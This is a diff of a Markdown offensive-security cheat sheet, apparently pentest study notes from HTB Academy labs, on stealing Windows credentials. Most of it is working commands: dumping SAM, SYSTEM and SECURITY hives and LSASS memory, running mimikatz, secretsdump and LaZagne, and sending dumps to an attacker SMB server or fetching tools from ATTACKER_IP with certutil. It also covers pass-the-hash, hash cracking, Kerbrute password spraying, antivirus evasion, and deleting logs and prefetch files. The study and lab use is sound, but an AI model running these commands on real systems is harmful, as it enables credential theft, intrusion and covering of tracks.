@@ -1,18 +1,21 @@
-# Windows Password Attacks
+# 🔧 Registry Hive Attacks (SAM, SYSTEM, SECURITY)
 
 ## Overview
+
 Windows stores password hashes in various locations that can be extracted and cracked with administrative access. This guide covers techniques for extracting and cracking Windows password hashes.
 
 ## Registry Hives
 
 ### Key Registry Locations
-| Registry Hive | Location | Description |
-|---------------|----------|-------------|
-| **HKLM\SAM** | `C:\Windows\System32\config\SAM` | Local user password hashes |
-| **HKLM\SYSTEM** | `C:\Windows\System32\config\SYSTEM` | System boot key (needed to decrypt SAM) |
+
+| Registry Hive     | Location                              | Description                                         |
+| ----------------- | ------------------------------------- | --------------------------------------------------- |
+| **HKLM\SAM**      | `C:\Windows\System32\config\SAM`      | Local user password hashes                          |
+| **HKLM\SYSTEM**   | `C:\Windows\System32\config\SYSTEM`   | System boot key (needed to decrypt SAM)             |
 | **HKLM\SECURITY** | `C:\Windows\System32\config\SECURITY` | LSA secrets, cached domain creds (DCC2), DPAPI keys |
 
 ### Backing Up Registry Hives
+
 ```cmd
 # Run as Administrator
 reg.exe save hklm\sam C:\sam.save
@@ -23,6 +26,7 @@ reg.exe save hklm\security C:\security.save
 ## File Transfer Methods
 
 ### Using Impacket SMB Server
+
 ```bash
 # On attacker machine - start SMB server
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/
@@ -34,6 +38,7 @@ move security.save \\10.10.15.16\CompData
 ```
 
 ### Other Transfer Methods
+
 ```bash
 # PowerShell download
 powershell -c "(New-Object Net.WebClient).UploadFile('http://10.10.15.16:8000/sam.save', 'C:\sam.save')"
@@ -51,6 +56,7 @@ put security.save
 ## Hash Extraction
 
 ### Using Impacket secretsdump
+
 ```bash
 # Extract hashes from saved hives
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
@@ -61,6 +67,7 @@ bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
 ```
 
 ### Alternative Tools
+
 ```bash
 # pwdump (Windows)
 pwdump.exe
@@ -78,6 +85,7 @@ lsadump::sam
 ## Remote Hash Dumping
 
 ### Using NetExec (formerly CrackMapExec)
+
 ```bash
 # Dump SAM hashes remotely
 netexec smb 10.129.42.198 --local-auth -u bob -p password --sam
@@ -90,6 +98,7 @@ netexec smb 10.129.42.198 --local-auth -u bob -p password --sam --lsa
 ```
 
 ### Using Impacket remotely
+
 ```bash
 # Remote secretsdump
 python3 secretsdump.py domain/user:password@10.129.42.198
@@ -101,26 +110,30 @@ python3 secretsdump.py domain/user@10.129.42.198 -hashes :nthash
 ## Hash Types and Formats
 
 ### NT Hash (NTLM)
-- **Format**: 32-character hexadecimal
-- **Example**: `64f12cddaa88057e06a81b54e73b949b`
-- **Hashcat Mode**: 1000
-- **Most common in modern Windows**
+
+* **Format**: 32-character hexadecimal
+* **Example**: `64f12cddaa88057e06a81b54e73b949b`
+* **Hashcat Mode**: 1000
+* **Most common in modern Windows**
 
 ### LM Hash (Legacy)
-- **Format**: 32-character hexadecimal
-- **Example**: `aad3b435b51404eeaad3b435b51404ee`
-- **Hashcat Mode**: 3000
-- **Weak, usually disabled in modern Windows**
+
+* **Format**: 32-character hexadecimal
+* **Example**: `aad3b435b51404eeaad3b435b51404ee`
+* **Hashcat Mode**: 3000
+* **Weak, usually disabled in modern Windows**
 
 ### DCC2 (Domain Cached Credentials)
-- **Format**: `$DCC2$iterations#username#hash`
-- **Example**: `$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25`
-- **Hashcat Mode**: 2100
-- **Much slower to crack (uses PBKDF2)**
+
+* **Format**: `$DCC2$iterations#username#hash`
+* **Example**: `$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25`
+* **Hashcat Mode**: 2100
+* **Much slower to crack (uses PBKDF2)**
 
 ## Cracking Windows Hashes
 
 ### NT Hash Cracking
+
 ```bash
 # Prepare hash file
 echo "64f12cddaa88057e06a81b54e73b949b" > nthashes.txt
@@ -136,6 +149,7 @@ hashcat -m 1000 nthashes.txt --show
 ```
 
 ### DCC2 Hash Cracking
+
 ```bash
 # DCC2 is much slower to crack
 hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
@@ -146,6 +160,7 @@ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /us
 ```
 
 ### Batch Hash Cracking
+
 ```bash
 # Multiple NT hashes
 cat > hashes.txt << EOF
@@ -162,13 +177,15 @@ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 ## DPAPI (Data Protection API)
 
 ### What DPAPI Protects
-- **Browser passwords** (Chrome, Edge, Firefox)
-- **Email passwords** (Outlook)
-- **Saved RDP credentials**
-- **Wireless network passwords**
-- **Credential Manager entries**
+
+* **Browser passwords** (Chrome, Edge, Firefox)
+* **Email passwords** (Outlook)
+* **Saved RDP credentials**
+* **Wireless network passwords**
+* **Credential Manager entries**
 
 ### DPAPI Keys from secretsdump
+
 ```bash
 # From secretsdump output
 dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
@@ -176,6 +193,7 @@ dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
 ```
 
 ### Decrypting DPAPI Blobs
+
 ```bash
 # Using Impacket dpapi
 python3 dpapi.py unprotect -key 0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643 -file encrypted_blob
@@ -191,13 +209,15 @@ dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Lo
 ## LSA Secrets
 
 ### What LSA Secrets Contain
-- **Service account passwords**
-- **Scheduled task credentials**
-- **Auto-logon passwords**
-- **DPAPI machine keys**
-- **Cached domain credentials**
+
+* **Service account passwords**
+* **Scheduled task credentials**
+* **Auto-logon passwords**
+* **DPAPI machine keys**
+* **Cached domain credentials**
 
 ### Extracting LSA Secrets
+
 ```bash
 # From secretsdump output
 [*] Dumping LSA Secrets
@@ -209,15 +229,18 @@ NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9
 ## LSASS Attacks
 
 ### Overview
+
 LSASS (Local Security Authority Subsystem Service) is a core Windows process that:
-- Enforces security policies
-- Handles user authentication
-- Stores sensitive credential material in memory
-- Caches credentials from active logon sessions
+
+* Enforces security policies
+* Handles user authentication
+* Stores sensitive credential material in memory
+* Caches credentials from active logon sessions
 
 ### LSASS Memory Dumping Methods
 
 #### 1. Task Manager Method (GUI Required)
+
 ```bash
 # Steps:
 1. Open Task Manager
@@ -228,6 +251,7 @@ LSASS (Local Security Authority Subsystem Service) is a core Windows process tha
 ```
 
 #### 2. Rundll32.exe & Comsvcs.dll Method
+
 ```cmd
 # IMPORTANT: Run PowerShell/CMD as Administrator!
 # LSASS dumping requires administrative privileges
@@ -243,6 +267,7 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump 664 C:\lsass.dmp full
 ```
 
 #### 3. Using Procdump
+
 ```cmd
 # Download Procdump from Microsoft Sysinternals
 procdump64.exe -accepteula -ma lsass.exe lsass.dmp
@@ -252,6 +277,7 @@ procdump64.exe -accepteula -ma 664 lsass.dmp
 ```
 
 #### 4. Using PowerShell
+
 ```powershell
 # Get LSASS process
 $lsass = Get-Process lsass
@@ -265,6 +291,7 @@ $process = [System.Diagnostics.Process]::GetProcessById($lsass.Id)
 ### Extracting Credentials from LSASS Dumps
 
 #### Using Pypykatz (Linux)
+
 ```bash
 # Basic extraction
 pypykatz lsa minidump /path/to/lsass.dmp
@@ -277,6 +304,7 @@ pypykatz lsa minidump /path/to/lsass.dmp --kerberos-dir /tmp/kerberos
 ```
 
 #### Using Mimikatz (Windows)
+
 ```cmd
 # Load dump file
 mimikatz.exe
@@ -295,6 +323,7 @@ sekurlsa::dpapi
 ### Credential Types in LSASS
 
 #### MSV (Microsoft Authentication Package)
+
 ```bash
 # Contains:
 - Username
@@ -313,6 +342,7 @@ SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
 ```
 
 #### WDIGEST (Legacy Authentication)
+
 ```bash
 # Contains plaintext passwords on older systems
 # Windows XP - Windows 8
@@ -326,6 +356,7 @@ password: Password123!  # Plaintext on older systems
 ```
 
 #### Kerberos (Active Directory)
+
 ```bash
 # Contains:
 - Kerberos tickets
@@ -340,6 +371,7 @@ Password: Password123!
 ```
 
 #### DPAPI (Data Protection API)
+
 ```bash
 # Contains:
 - Master keys
@@ -356,6 +388,7 @@ masterkey: e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05
 ### Live Memory Extraction
 
 #### Using Mimikatz (Direct)
+
 ```cmd
 # Run on target system
 mimikatz.exe
@@ -370,6 +403,7 @@ sekurlsa::dpapi
 ```
 
 #### Using PowerShell Empire
+
 ```powershell
 # Load Mimikatz module
 Invoke-Mimikatz -Command "privilege::debug"
@@ -379,6 +413,7 @@ Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
 ### Remote LSASS Attacks
 
 #### Using NetExec
+
 ```bash
 # Dump LSASS remotely
 netexec smb 10.129.42.198 -u user -p password --lsa
@@ -388,6 +423,7 @@ netexec smb 10.129.42.198 -u user -p password --sam --lsa
 ```
 
 #### Using Impacket
+
 ```bash
 # Remote secretsdump (includes LSASS)
 python3 secretsdump.py domain/user:password@10.129.42.198
@@ -399,6 +435,7 @@ python3 secretsdump.py domain/user:password@10.129.42.198 -outputfile lsass_dump
 ### Cracking Extracted Credentials
 
 #### NT Hashes from LSASS
+
 ```bash
 # Extract NT hashes from pypykatz output
 grep "NT:" credentials.txt | cut -d: -f2 | sort -u > nt_hashes.txt
@@ -413,6 +450,7 @@ hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.tx
 ### Defense Evasion for LSASS
 
 #### Avoiding Detection
+
 ```bash
 # Use legitimate tools
 procdump64.exe -accepteula -ma lsass.exe lsass.dmp
@@ -425,6 +463,7 @@ schtasks /create /tn "SystemDump" /tr "rundll32 C:\windows\system32\comsvcs.dll,
 ```
 
 #### Cleanup
+
 ```cmd
 # Remove dump files
 del C:\lsass.dmp
@@ -438,6 +477,7 @@ del C:\Windows\Prefetch\PROCDUMP*.pf
 ### Common Issues and Solutions
 
 #### Access Denied
+
 ```bash
 # Ensure admin privileges
 whoami /priv | findstr SeDebugPrivilege
@@ -451,6 +491,7 @@ privilege::debug
 ```
 
 #### Antivirus Detection
+
 ```bash
 # Use legitimate Microsoft tools
 procdump64.exe (signed by Microsoft)
@@ -463,6 +504,7 @@ procdump64.exe (signed by Microsoft)
 ```
 
 #### Large Dump Files
+
 ```bash
 # Compress before transfer
 7z a lsass.7z lsass.dmp
@@ -477,6 +519,7 @@ for file in lsass_part_*; do scp $file user@attacker:/tmp/; done
 ### Practical LSASS Attack Workflow
 
 #### Complete Example: Task Manager Method
+
 ```bash
 # 1. Connect to target via RDP
 xfreerdp /v:10.129.202.149 /u:htb-student /p:HTB_@cademy_stdnt!
@@ -530,6 +573,7 @@ hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.tx
 #### Command-line Method Workflow
 
 #### 1. Enumerate Running Processes
+
 ```cmd
 # Find LSASS PID
 tasklist /svc | findstr lsass
@@ -537,12 +581,14 @@ Get-Process lsass
 ```
 
 #### 2. Create Memory Dump
+
 ```cmd
 # Choose method based on environment
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ```
 
 #### 3. Transfer Dump File
+
 ```bash
 # Start SMB server
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /tmp/
@@ -552,6 +598,7 @@ move C:\lsass.dmp \\attacker-ip\share\
 ```
 
 #### 4. Extract Credentials
+
 ```bash
 # Use pypykatz
 pypykatz lsa minidump lsass.dmp > credentials.txt
@@ -562,6 +609,7 @@ grep "password:" credentials.txt | grep -v "None" > plaintext_passwords.txt
 ```
 
 #### 5. Crack or Use Hashes
+
 ```bash
 # Crack NT hashes
 hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt
@@ -573,6 +621,7 @@ netexec smb targets.txt -u username -H nt_hash
 ## Advanced Techniques
 
 ### Pass-the-Hash
+
 ```bash
 # Use NT hash directly (no cracking needed)
 netexec smb 10.129.42.198 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
@@ -585,6 +634,7 @@ python3 psexec.py administrator@10.129.42.198 -hashes :31d6cfe0d16ae931b73c59d7e
 ```
 
 ### Memory Dumping (Legacy)
+
 ```bash
 # Dump LSASS memory
 procdump64.exe -accepteula -ma lsass.exe lsass.dmp
@@ -598,6 +648,7 @@ sekurlsa::logonpasswords
 ## Practical Workflow
 
 ### 1. Gain Administrative Access
+
 ```bash
 # Verify admin access
 whoami /groups | findstr "S-1-5-32-544"
@@ -607,6 +658,7 @@ netexec smb target -u user -p password --local-auth
 ```
 
 ### 2. Extract Registry Hives
+
 ```cmd
 # Save hives to temp location
 reg.exe save hklm\sam C:\temp\sam.save
@@ -615,6 +667,7 @@ reg.exe save hklm\security C:\temp\security.save
 ```
 
 ### 3. Transfer Files
+
 ```bash
 # Start SMB server on attacker
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /tmp/
@@ -624,12 +677,14 @@ move C:\temp\*.save \\attacker-ip\share\
 ```
 
 ### 4. Extract Hashes
+
 ```bash
 # Use secretsdump
 python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL > hashes.txt
 ```
 
 ### 5. Crack Hashes
+
 ```bash
 # Extract NT hashes
 grep ":::" hashes.txt | cut -d: -f4 > nthashes.txt
@@ -641,6 +696,7 @@ hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hash
 ## Defense Evasion
 
 ### Avoiding Detection
+
 ```bash
 # Use living-off-the-land binaries
 reg.exe save hklm\sam C:\windows\temp\sam.save
@@ -654,6 +710,7 @@ reg.exe save hklm\sam C:\users\public\sam.save
 ```
 
 ### Cleanup
+
 ```cmd
 # Remove saved hives
 del C:\temp\sam.save
@@ -667,6 +724,7 @@ doskey /history > nul
 ## Common Issues and Solutions
 
 ### Access Denied
+
 ```bash
 # Ensure you have admin rights
 net user %username% | findstr "Local Group Memberships"
@@ -676,6 +734,7 @@ psexec.exe -i -s cmd.exe
 ```
 
 ### Large Hash Files
+
 ```bash
 # Split large hash files
 split -l 1000 hashes.txt hash_part_
@@ -686,6 +745,7 @@ hashcat -m 1000 hash_part_ab wordlist.txt &
 ```
 
 ### Slow Cracking
+
 ```bash
 # Use mask attacks for known patterns
 hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?d?d?d?d
@@ -695,6 +755,7 @@ hashcat -m 1000 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-3000
 ```
 
 ## Hash Identification
+
 ```bash
 # NT hash: 32 hex chars
 # Example: 64f12cddaa88057e06a81b54e73b949b
@@ -709,20 +770,24 @@ hashcat -m 1000 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-3000
 ## Windows Credential Manager Attacks
 
 ### Overview
+
 Windows Credential Manager stores encrypted credentials in special folders:
-- **%UserProfile%\AppData\Local\Microsoft\Vault\**
-- **%UserProfile%\AppData\Local\Microsoft\Credentials\**
-- **%UserProfile%\AppData\Roaming\Microsoft\Vault\**
-- **%ProgramData%\Microsoft\Vault\**
-- **%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\**
+
+* \*_%UserProfile%\AppData\Local\Microsoft\Vault\*_
+* \*_%UserProfile%\AppData\Local\Microsoft\Credentials\*_
+* \*_%UserProfile%\AppData\Roaming\Microsoft\Vault\*_
+* \*_%ProgramData%\Microsoft\Vault\*_
+* \*_%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\*_
 
 ### Credential Types
-| Type | Description |
-|------|-------------|
-| **Web Credentials** | Website passwords, online accounts (IE, legacy Edge) |
-| **Windows Credentials** | Domain users, OneDrive, network resources, services |
+
+| Type                    | Description                                          |
+| ----------------------- | ---------------------------------------------------- |
+| **Web Credentials**     | Website passwords, online accounts (IE, legacy Edge) |
+| **Windows Credentials** | Domain users, OneDrive, network resources, services  |
 
 ### Enumerating Stored Credentials
+
 ```cmd
 # List stored credentials
 cmdkey /list
@@ -735,6 +800,7 @@ cmdkey /list
 ```
 
 ### Using Stored Credentials
+
 ```cmd
 # Impersonate user with stored credentials
 runas /savecred /user:SRV01\mcharles cmd
@@ -743,6 +809,7 @@ runas /savecred /user:SRV01\mcharles cmd
 ```
 
 ### Extracting Credentials with Mimikatz
+
 ```cmd
 # Run mimikatz as administrator
 mimikatz.exe
@@ -765,6 +832,7 @@ sekurlsa::credman
 ```
 
 ### Alternative Tools
+
 ```bash
 # Other credential extraction tools
 # SharpDPAPI - C# tool for DPAPI attacks
@@ -775,16 +843,19 @@ sekurlsa::credman
 ## LaZagne - Multi-Platform Password Recovery
 
 ### Overview
+
 LaZagne is an open-source application used to retrieve passwords stored on a local computer. It can extract passwords from various software including browsers, email clients, databases, WiFi, and more.
 
 ### Key Features
-- **Multi-platform support** (Windows, Linux, macOS)
-- **60+ software modules** for password extraction
-- **Standalone executable** - no installation required
-- **Comprehensive reporting** with found credentials
-- **Silent operation** possible
+
+* **Multi-platform support** (Windows, Linux, macOS)
+* **60+ software modules** for password extraction
+* **Standalone executable** - no installation required
+* **Comprehensive reporting** with found credentials
+* **Silent operation** possible
 
 ### Installation
+
 ```bash
 # Download latest release
 wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe
@@ -796,6 +867,7 @@ pip install -r requirements.txt
 ```
 
 ### Basic Usage
+
 ```cmd
 # Run all modules
 LaZagne.exe all
@@ -816,34 +888,41 @@ LaZagne.exe all -quiet
 ### Supported Software Categories
 
 #### Browsers
-- Chrome, Firefox, Internet Explorer, Edge
-- Opera, Safari, SeaMonkey
-- UC Browser, Chromium-based browsers
+
+* Chrome, Firefox, Internet Explorer, Edge
+* Opera, Safari, SeaMonkey
+* UC Browser, Chromium-based browsers
 
 #### Email Clients
-- Outlook, Thunderbird
-- Windows Mail, Mailbird
+
+* Outlook, Thunderbird
+* Windows Mail, Mailbird
 
 #### Chat Applications
-- Pidgin, Psi, Skype
-- Jitsi, IceChat
+
+* Pidgin, Psi, Skype
+* Jitsi, IceChat
 
 #### Databases
-- SQLite, MySQL, PostgreSQL
-- MongoDB, CouchDB
+
+* SQLite, MySQL, PostgreSQL
+* MongoDB, CouchDB
 
 #### FTP Clients
-- FileZilla, WinSCP, FlashFXP
-- SmartFTP, FTPNavigator
+
+* FileZilla, WinSCP, FlashFXP
+* SmartFTP, FTPNavigator
 
 #### System Credentials
-- Windows Credential Manager
-- LSA Secrets, Autologon
-- IIS Application Pool
+
+* Windows Credential Manager
+* LSA Secrets, Autologon
+* IIS Application Pool
 
 ### HTB Academy Scenario Walkthrough
 
 #### Scenario Setup
+
 ```bash
 # Target: Windows machine with saved credentials
 # Access: RDP session as sadams
@@ -851,6 +930,7 @@ LaZagne.exe all -quiet
 ```
 
 #### Step 1: Initial Enumeration
+
 ```cmd
 # Check current user context
 whoami
@@ -862,6 +942,7 @@ cmdkey /list
 ```
 
 #### Step 2: Privilege Escalation
+
 ```cmd
 # Use saved credentials to impersonate mcharles
 runas /savecred /user:SRV01\mcharles cmd
@@ -872,6 +953,7 @@ whoami
 ```
 
 #### Step 3: LaZagne Deployment
+
 ```bash
 # On attacker machine - setup web server
 mkdir www && cd www
@@ -885,6 +967,7 @@ certutil -urlcache -split -f "http://ATTACKER_IP:8000/LaZagne.exe" C:\Windows\Te
 ```
 
 #### Step 4: Credential Extraction
+
 ```cmd
 # Run LaZagne with all modules
 C:\Windows\Temp\lazagne.exe all
@@ -907,6 +990,7 @@ C:\Windows\Temp\lazagne.exe all
 ### LaZagne Modules
 
 #### Common Modules
+
 ```cmd
 # Browser passwords
 LaZagne.exe browsers
@@ -928,6 +1012,7 @@ LaZagne.exe databases
 ```
 
 #### Module-Specific Examples
+
 ```cmd
 # Chrome passwords only
 LaZagne.exe browsers -chrome
@@ -942,6 +1027,7 @@ LaZagne.exe browsers chats sysadmin
 ### Output Formats
 
 #### Console Output
+
 ```bash
 ########## User: username ##########
 
@@ -955,6 +1041,7 @@ Password: MySecretPassword123
 ```
 
 #### JSON Output
+
 ```cmd
 # Export as JSON
 LaZagne.exe all -oJ output.json
@@ -975,6 +1062,7 @@ LaZagne.exe all -oJ output.json
 ### Advanced Usage
 
 #### Silent Mode with Output
+
 ```cmd
 # Run silently and save to file
 LaZagne.exe all -quiet -oN credentials.txt
@@ -984,6 +1072,7 @@ type credentials.txt
 ```
 
 #### Specific Categories
+
 ```cmd
 # Only extract browser and email passwords
 LaZagne.exe browsers mails
@@ -993,6 +1082,7 @@ LaZagne.exe sysadmin memory
 ```
 
 #### Remote Deployment
+
 ```powershell
 # PowerShell download and execute
 $url = "http://attacker:8000/LaZagne.exe"
@@ -1004,11 +1094,13 @@ Invoke-WebRequest -Uri $url -OutFile $output
 ### Detection and Evasion
 
 #### Common Detections
-- **Antivirus signatures** - LaZagne often flagged as malicious
-- **Behavioral analysis** - Multiple password extraction attempts
-- **Process monitoring** - Unusual file access patterns
+
+* **Antivirus signatures** - LaZagne often flagged as malicious
+* **Behavioral analysis** - Multiple password extraction attempts
+* **Process monitoring** - Unusual file access patterns
 
 #### Evasion Techniques
+
 ```bash
 # Compile from source with modifications
 # Use custom packer/crypter
@@ -1019,29 +1111,32 @@ Invoke-WebRequest -Uri $url -OutFile $output
 ### Defense Against LaZagne
 
 #### Preventive Measures
-- **Don't save passwords** in browsers/applications
-- **Use password managers** with strong encryption
-- **Enable Credential Guard** on Windows 10/11
-- **Regular security awareness training**
+
+* **Don't save passwords** in browsers/applications
+* **Use password managers** with strong encryption
+* **Enable Credential Guard** on Windows 10/11
+* **Regular security awareness training**
 
 #### Detection Methods
-- **Monitor for LaZagne signatures** in AV/EDR
-- **Process monitoring** for credential access patterns
-- **File integrity monitoring** for credential stores
-- **Network monitoring** for C2 traffic
+
+* **Monitor for LaZagne signatures** in AV/EDR
+* **Process monitoring** for credential access patterns
+* **File integrity monitoring** for credential stores
+* **Network monitoring** for C2 traffic
 
 ### LaZagne vs Other Tools
 
-| Tool | Platform | Coverage | Stealth | Ease of Use |
-|------|----------|----------|---------|-------------|
-| **LaZagne** | Multi | High | Low | High |
-| **Mimikatz** | Windows | High | Low | Medium |
-| **SharpChrome** | Windows | Chrome only | Medium | Medium |
-| **HackBrowserData** | Multi | Browsers only | Medium | High |
+| Tool                | Platform | Coverage      | Stealth | Ease of Use |
+| ------------------- | -------- | ------------- | ------- | ----------- |
+| **LaZagne**         | Multi    | High          | Low     | High        |
+| **Mimikatz**        | Windows  | High          | Low     | Medium      |
+| **SharpChrome**     | Windows  | Chrome only   | Medium  | Medium      |
+| **HackBrowserData** | Multi    | Browsers only | Medium  | High        |
 
 ### Manual Credential Hunting
 
 ### Manual Credential Export
+
 ```cmd
 # Open Credential Manager GUI
 rundll32 keymgr.dll,KRShowKeyMgr
@@ -1051,14 +1146,16 @@ rundll32 keymgr.dll,KRShowKeyMgr
 ```
 
 ### Common Credential Targets
-- **OneDrive** - Microsoft account credentials
-- **Domain accounts** - Cached domain user passwords
-- **Network resources** - UNC paths, shared folders
-- **VPN connections** - Saved VPN credentials
-- **RDP connections** - Saved RDP passwords
-- **Web applications** - Browser-saved passwords
+
+* **OneDrive** - Microsoft account credentials
+* **Domain accounts** - Cached domain user passwords
+* **Network resources** - UNC paths, shared folders
+* **VPN connections** - Saved VPN credentials
+* **RDP connections** - Saved RDP passwords
+* **Web applications** - Browser-saved passwords
 
 ### Credential Manager Attack Workflow
+
 ```cmd
 # 1. Enumerate stored credentials
 cmdkey /list
@@ -1079,47 +1176,54 @@ sekurlsa::credman
 ```
 
 ### Defense Considerations
-- **Credential Guard** - Protects DPAPI master keys in secure enclaves
-- **DPAPI protection** - Credentials encrypted with user-specific keys
-- **AES encryption** - Policy.vpol files use AES-128/256
-- **Virtualization-based Security** - Modern Windows protection
+
+* **Credential Guard** - Protects DPAPI master keys in secure enclaves
+* **DPAPI protection** - Credentials encrypted with user-specific keys
+* **AES encryption** - Policy.vpol files use AES-128/256
+* **Virtualization-based Security** - Modern Windows protection
 
 ## Tools Summary
 
 ### Extraction Tools
-- **reg.exe** - Windows registry export
-- **secretsdump.py** - Impacket hash extraction
-- **NetExec** - Remote hash dumping
-- **Mimikatz** - Memory and registry dumping
-- **cmdkey** - Credential Manager enumeration
-- **LaZagne** - Multi-platform password recovery
-- **Kerbrute** - Kerberos username enumeration and password attacks
+
+* **reg.exe** - Windows registry export
+* **secretsdump.py** - Impacket hash extraction
+* **NetExec** - Remote hash dumping
+* **Mimikatz** - Memory and registry dumping
+* **cmdkey** - Credential Manager enumeration
+* **LaZagne** - Multi-platform password recovery
+* **Kerbrute** - Kerberos username enumeration and password attacks
 
 ### Cracking Tools
-- **Hashcat** - GPU-accelerated cracking
-- **John the Ripper** - CPU-based cracking
-- **Rainbow tables** - Pre-computed hash lookups
+
+* **Hashcat** - GPU-accelerated cracking
+* **John the Ripper** - CPU-based cracking
+* **Rainbow tables** - Pre-computed hash lookups
 
 ### Transfer Tools
-- **smbserver.py** - Impacket SMB server
-- **PowerShell** - Native Windows transfer
-- **certutil** - Windows certificate utility (can download files)
+
+* **smbserver.py** - Impacket SMB server
+* **PowerShell** - Native Windows transfer
+* **certutil** - Windows certificate utility (can download files)
 
 ## Kerbrute - Kerberos Pre-Authentication Attack Tool
 
 ### Overview
+
 Kerbrute is a tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. It's much faster than traditional password attacks and potentially stealthier since pre-authentication failures don't trigger the standard "An account failed to log on" event 4625.
 
 ### Key Features
-- **Fast enumeration** - Single UDP frame to KDC (Domain Controller)
-- **Username enumeration** - No login failures, no account lockouts
-- **Password spraying** - Test single password against user list
-- **Brute force attacks** - Traditional password attacks
-- **Multithreaded** - 10 threads by default (configurable)
+
+* **Fast enumeration** - Single UDP frame to KDC (Domain Controller)
+* **Username enumeration** - No login failures, no account lockouts
+* **Password spraying** - Test single password against user list
+* **Brute force attacks** - Traditional password attacks
+* **Multithreaded** - 10 threads by default (configurable)
 
 ### Installation
 
 #### Pre-compiled Binaries
+
 ```bash
 # Download from GitHub releases
 wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
@@ -1127,6 +1231,7 @@ chmod +x kerbrute_linux_amd64
 ```
 
 #### Compile from Source (ARM64/M1 Mac)
+
 ```bash
 # Install Go if not present
 sudo apt update && sudo apt install golang-go
@@ -1140,7 +1245,8 @@ go build -ldflags "-s -w" .
 ./kerbrute --help
 ```
 
-#### Docker Alternative (x86_64 emulation)
+#### Docker Alternative (x86\_64 emulation)
+
 ```bash
 # Use x86_64 container for compatibility
 docker run --rm -it --platform linux/amd64 golang:alpine sh
@@ -1153,6 +1259,7 @@ cd kerbrute && go build .
 ### Basic Usage
 
 #### Username Enumeration (Safest)
+
 ```bash
 # Basic user enumeration
 ./kerbrute userenum -d domain.local usernames.txt --dc 10.10.10.10
@@ -1170,6 +1277,7 @@ cd kerbrute && go build .
 ```
 
 #### Password Spraying (Careful - Can Lock Accounts!)
+
 ```bash
 # Single password against user list
 ./kerbrute passwordspray -d domain.local users.txt Password123
@@ -1186,6 +1294,7 @@ cd kerbrute && go build .
 ```
 
 #### Brute Force Single User (High Risk!)
+
 ```bash
 # Brute force specific user
 ./kerbrute bruteuser -d domain.local passwords.txt administrator
@@ -1195,6 +1304,7 @@ cd kerbrute && go build .
 ```
 
 #### Brute Force Credential Combos
+
 ```bash
 # Username:password combinations from file
 ./kerbrute bruteforce -d domain.local combos.txt
@@ -1211,6 +1321,7 @@ cat combos.txt | ./kerbrute bruteforce -d domain.local -
 ### Advanced Usage
 
 #### Thread Control
+
 ```bash
 # Increase threads for faster enumeration
 ./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 -t 50
@@ -1220,6 +1331,7 @@ cat combos.txt | ./kerbrute bruteforce -d domain.local -
 ```
 
 #### Hash Capture (AS-REP Roasting)
+
 ```bash
 # Capture AS-REP hashes for offline cracking
 ./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 --hash-file asrep_hashes.txt
@@ -1229,6 +1341,7 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 #### Force Downgraded Encryption
+
 ```bash
 # Use weaker encryption (sometimes bypasses detection)
 ./kerbrute userenum -d domain.local users.txt --dc 10.10.10.10 --downgrade
@@ -1237,6 +1350,7 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ### Creating Username Lists
 
 #### Common Username Conventions
+
 ```bash
 # Based on "John Smith" - create variations
 cat > usernames.txt << EOF
@@ -1254,6 +1368,7 @@ EOF
 ```
 
 #### Automated Username Generation
+
 ```bash
 # Use Username Anarchy for pattern generation
 git clone https://github.com/urbanadventurer/username-anarchy.git
@@ -1278,6 +1393,7 @@ chmod +x generate_users.sh
 ### Attack Workflows
 
 #### HTB Academy Scenario
+
 ```bash
 # 1. Initial enumeration with common usernames
 ./kerbrute userenum -d inlanefreight.local common_users.txt --dc 10.129.201.57 -v
@@ -1302,6 +1418,7 @@ EOF
 ```
 
 #### PJPT Exam Strategy
+
 ```bash
 # Step 1: Quick user enum with common names
 ./kerbrute userenum -d domain.local /usr/share/seclists/Usernames/top-usernames-shortlist.txt --dc $DC_IP
@@ -1320,6 +1437,7 @@ EOF
